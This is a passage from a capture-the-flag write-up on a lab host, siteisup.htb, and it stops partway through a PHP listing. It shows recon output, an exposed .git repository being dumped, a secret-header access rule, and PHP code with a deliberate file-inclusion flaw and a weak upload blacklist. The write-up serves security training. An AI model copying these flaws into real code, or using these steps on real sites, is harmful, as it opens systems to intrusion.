+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>08:30:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  277B  - /dev/.html
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>08:30:30<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  277B  - /dev/.php
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>08:30:36<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  277B  - /dev/.htm
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>08:30:36<span style=color:#f92672>]</span> <span style=color:#ae81ff>301</span> -  315B  - /dev/.git  -&gt;  http://siteisup.htb/dev/.git/
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>08:30:37<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  277B  - /dev/.htpasswds
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>08:30:54<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  277B  - /dev/wp-forum.phps
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>08:31:16<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  277B  - /dev/.htuser
+</span></span><span style=display:flex><span>CTRL+C detected: Pausing threads, please wait...
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>q<span style=color:#f92672>]</span>uit / <span style=color:#f92672>[</span>c<span style=color:#f92672>]</span>ontinue: q
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Canceled by the user
+</span></span></code></pre></div><ul><li>Great! We found a <code>.git</code> repository.</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>08:30:36<span style=color:#f92672>]</span> <span style=color:#ae81ff>301</span> -  315B  - /dev/.git  -&gt;  http://siteisup.htb/dev/.git/
+</span></span></code></pre></div><ul><li>What is <code>.git</code> directory?</li></ul><p>The <code>.git</code> directory is a directory that is created when a developer initializes a new Git repository on their computer. It is used to store all of the version control information for the project, including a history of all of the changes that have been made to the project, as well as any branches and tags that have been created.</p><p>If a penetration tester finds the <code>.git</code> directory on a web application, it may be a potential security concern because it could contain sensitive information about the application and its development history. For example, the <code>.git</code> directory may contain a list of all of the files in the repository, as well as the names of the developers who have worked on the project. This information could potentially be used by an attacker to identify vulnerabilities in the application or to craft targeted attacks.</p><p>It is generally a good practice to ensure that the <code>.git</code> directory is not accessible from the web, as it could potentially expose sensitive information about the application. This can typically be done by adding the <code>.git</code> directory to the <code>.gitignore</code> file or by configuring the web server to block access to it.</p><ul><li><code>/dev/.git</code> Endpoint:</li></ul><p><img src=/images/Pasted-image-20221230083657.png alt="Image alt"></p><p><a href=https://pentester.land/blog/source-code-disclosure-via-exposed-git-folder/>External resource: exploiting exposed .git directory - pentester.land</a></p><h2 id=obtaining-the-secrets>Obtaining the secrets:</h2><ul><li>We will use a tool called <a href=https://github.com/arthaud/git-dumper.git>git-dumper</a></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>goku@exploitation:~$ git-dumper http://siteisup.htb/dev/.git/ ~/siteisup-dev
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Testing http://siteisup.htb/dev/.git/HEAD <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Testing http://siteisup.htb/dev/.git/ <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching .git recursively
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.gitignore <span style=color:#f92672>[</span>404<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> http://siteisup.htb/dev/.gitignore responded with status code <span style=color:#ae81ff>404</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/ <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/packed-refs <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/branches/ <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/HEAD <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/description <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/refs/ <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/logs/ <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/config <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/objects/ <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/hooks/ <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/index <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/logs/HEAD <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/logs/refs/ <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/objects/info/ <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/refs/heads/ <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/refs/remotes/ <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/objects/pack/ <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/refs/tags/ <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/hooks/applypatch-msg.sample <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/hooks/commit-msg.sample <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/hooks/fsmonitor-watchman.sample <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/hooks/pre-merge-commit.sample <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/hooks/pre-commit.sample <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/hooks/pre-applypatch.sample <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/hooks/post-update.sample <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/hooks/pre-push.sample <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/hooks/pre-rebase.sample <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/hooks/pre-receive.sample <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/hooks/prepare-commit-msg.sample <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/hooks/push-to-checkout.sample <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/logs/refs/heads/ <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/hooks/update.sample <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/logs/refs/remotes/ <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/refs/remotes/origin/ <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.idx <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/refs/heads/main <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.pack <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/logs/refs/remotes/origin/ <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/logs/refs/heads/main <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/refs/remotes/origin/HEAD <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/logs/refs/remotes/origin/HEAD <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/info/ <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Fetching http://siteisup.htb/dev/.git/info/exclude <span style=color:#f92672>[</span>200<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Running git checkout .
+</span></span><span style=display:flex><span>Updated <span style=color:#ae81ff>6</span> paths from the index
+</span></span></code></pre></div><ul><li>Let&rsquo;s examine the source code:</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>goku@exploitation:~$ tree siteisup-dev
+</span></span><span style=display:flex><span>siteisup-dev
+</span></span><span style=display:flex><span>├── admin.php
+</span></span><span style=display:flex><span>├── changelog.txt
+</span></span><span style=display:flex><span>├── checker.php
+</span></span><span style=display:flex><span>├── index.php
+</span></span><span style=display:flex><span>└── stylesheet.css
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span> directories, <span style=color:#ae81ff>5</span> files
+</span></span></code></pre></div><h2 id=source-code-review>Source code review:</h2><ul><li>The dumped git repository:</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>goku@exploitation:~/siteisup-dev$ ls -alh
+</span></span><span style=display:flex><span>total 40K
+</span></span><span style=display:flex><span>drwxr-xr-x  <span style=color:#ae81ff>3</span> goku goku 4.0K Dec <span style=color:#ae81ff>30</span> 08:48 .
+</span></span><span style=display:flex><span>drwx------ <span style=color:#ae81ff>26</span> goku goku 4.0K Dec <span style=color:#ae81ff>30</span> 08:48 ..
+</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> goku goku   <span style=color:#ae81ff>59</span> Dec <span style=color:#ae81ff>30</span> 08:48 admin.php
+</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> goku goku  <span style=color:#ae81ff>147</span> Dec <span style=color:#ae81ff>30</span> 08:48 changelog.txt
+</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> goku goku 3.1K Dec <span style=color:#ae81ff>30</span> 08:48 checker.php
+</span></span><span style=display:flex><span>drwxr-xr-x  <span style=color:#ae81ff>7</span> goku goku 4.0K Dec <span style=color:#ae81ff>30</span> 08:48 .git
+</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> goku goku  <span style=color:#ae81ff>117</span> Dec <span style=color:#ae81ff>30</span> 08:48 .htaccess
+</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> goku goku  <span style=color:#ae81ff>273</span> Dec <span style=color:#ae81ff>30</span> 08:48 index.php
+</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> goku goku 5.5K Dec <span style=color:#ae81ff>30</span> 08:48 stylesheet.css
+</span></span></code></pre></div><ul><li>What is <code>.htaccess</code>?
+The <code>.htaccess</code> file is a text file that contains a set of configuration directives written in Apache&rsquo;s domain-specific language. These directives can be used to specify how the web server should behave in certain situations, such as how it should handle requests for specific files or directories, or how it should redirect requests to other pages.</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>goku@exploitation:~/siteisup-dev$ cat .htaccess
+</span></span><span style=display:flex><span>SetEnvIfNoCase Special-Dev <span style=color:#e6db74>&#34;only4dev&#34;</span> Required-Header
+</span></span><span style=display:flex><span>Order Deny,Allow
+</span></span><span style=display:flex><span>Deny from All
+</span></span><span style=display:flex><span>Allow from env<span style=color:#f92672>=</span>Required-Header
+</span></span></code></pre></div><ul><li><p>This <code>.htaccess</code> file is used to restrict access to the website or directory to only those clients that have the <code>Special-Dev</code> header set to <code>"only4dev"</code>. All other clients will be denied access.</p></li><li><p>Okay, so now we know that in order to access the <code>dev.siteisup.htb</code> website, we need a special HTTP header.</p></li><li><p>Let&rsquo;s configure Burp Suite to include this header:</p></li></ul><p><img src=/images/Pasted-image-20221230121741.png alt="Image alt"></p><ul><li>Enjoy!</li></ul><p><img src=/images/Pasted-image-20221230121832.png alt="Image alt"></p><ul><li>To browse the website using a browser, i used an extension called <code>Modify Header Value (HTTP Headers)</code></li></ul><p><img src=/images/Pasted-image-20221230131555.png alt="Image alt"></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>goku@exploitation:~/siteisup-dev$ cat changelog.txt
+</span></span><span style=display:flex><span>Beta version
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>1- Check a bunch of websites.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>-- ToDo:
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>1- Multithreading <span style=color:#66d9ef>for</span> a faster version :D.
+</span></span><span style=display:flex><span>2- Remove the upload option.
+</span></span><span style=display:flex><span>3- New admin panel.
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e># index.php source code
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>b</span><span style=color:#f92672>&gt;</span><span style=color:#66d9ef>This</span> <span style=color:#a6e22e>is</span> <span style=color:#a6e22e>only</span> <span style=color:#66d9ef>for</span> <span style=color:#a6e22e>developers</span><span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>b</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>br</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>a</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;?page=admin&#34;</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>Admin</span> <span style=color:#a6e22e>Panel</span><span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>a</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>define</span>(<span style=color:#e6db74>&#34;DIRECTACCESS&#34;</span>,<span style=color:#66d9ef>false</span>);
+</span></span><span style=display:flex><span>	$page<span style=color:#f92672>=</span>$_GET[<span style=color:#e6db74>&#39;page&#39;</span>];
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>($page <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/bin|usr|home|var|etc/i&#34;</span>,$page)){
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>include</span>($_GET[<span style=color:#e6db74>&#39;page&#39;</span>] <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;.php&#34;</span>);
+</span></span><span style=display:flex><span>	}<span style=color:#66d9ef>else</span>{
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>include</span>(<span style=color:#e6db74>&#34;checker.php&#34;</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e># checker.php source code
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>DIRECTACCESS</span>){
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;Access Denied&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;!DOCTYPE html&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;html&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>  &lt;head&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>    &lt;meta charset=&#39;utf-8&#39; /&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>    &lt;meta http-equiv=&#34;X-UA-Compatible&#34; content=&#34;chrome=1&#34; /&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>    &lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; media=&#34;screen&#34; href=&#34;stylesheet.css&#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>    &lt;title&gt;Is my Website up ? (beta version)&lt;/title&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>  &lt;/head&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>  &lt;body&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>    &lt;div id=&#34;header_wrap&#34; class=&#34;outer&#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &lt;header class=&#34;inner&#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>          &lt;h1 id=&#34;project_title&#34;&gt;Welcome,&lt;br&gt; Is My Website UP ?&lt;/h1&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>          &lt;h2 id=&#34;project_tagline&#34;&gt;In this version you are able to scan a list of websites !&lt;/h2&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &lt;/header&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>    &lt;/div&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>    &lt;div id=&#34;main_content_wrap&#34; class=&#34;outer&#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>      &lt;section id=&#34;main_content&#34; class=&#34;inner&#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &lt;form method=&#34;post&#34; enctype=&#34;multipart/form-data&#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>			    &lt;label&gt;List of websites to check:&lt;/label&gt;&lt;br&gt;&lt;br&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>				&lt;input type=&#34;file&#34; name=&#34;file&#34; size=&#34;50&#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>				&lt;input name=&#34;check&#34; type=&#34;submit&#34; value=&#34;Check&#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>		&lt;/form&gt;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;?php
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>function isitup($url){
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	$ch=curl_init();
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	curl_setopt($ch, CURLOPT_URL, trim($url));
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	curl_setopt($ch, CURLOPT_USERAGENT, &#34;siteisup.htb beta&#34;);
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	curl_setopt($ch, CURLOPT_HEADER, 1);
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	$f = curl_exec($ch);
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	$header = curl_getinfo($ch);
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	if($f AND $header[&#39;http_code&#39;] == 200){
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>		return array(true,$f);
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	}else{
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>		return false;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	}
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>    curl_close($ch);
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>}
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>if($_POST[&#39;check&#39;]){
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	# File size must be less than 10kb.
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	if ($_FILES[&#39;file&#39;][&#39;size&#39;] &gt; 10000) {
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        die(&#34;File too large!&#34;);
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>    }
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	$file = $_FILES[&#39;file&#39;][&#39;name&#39;];
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	# Check if extension is allowed.
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	$ext = getExtension($file);
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	if(preg_match(&#34;/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i&#34;,$ext)){
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>		die(&#34;Extension not allowed!&#34;);
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	}
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	# Create directory to upload our file.
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	$dir = &#34;uploads/&#34;.md5(time()).&#34;/&#34;;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	if(!is_dir($dir)){
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        mkdir($dir, 0770, true);
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>    }
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>  # Upload the file.
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>	$final_path = $dir.$file;
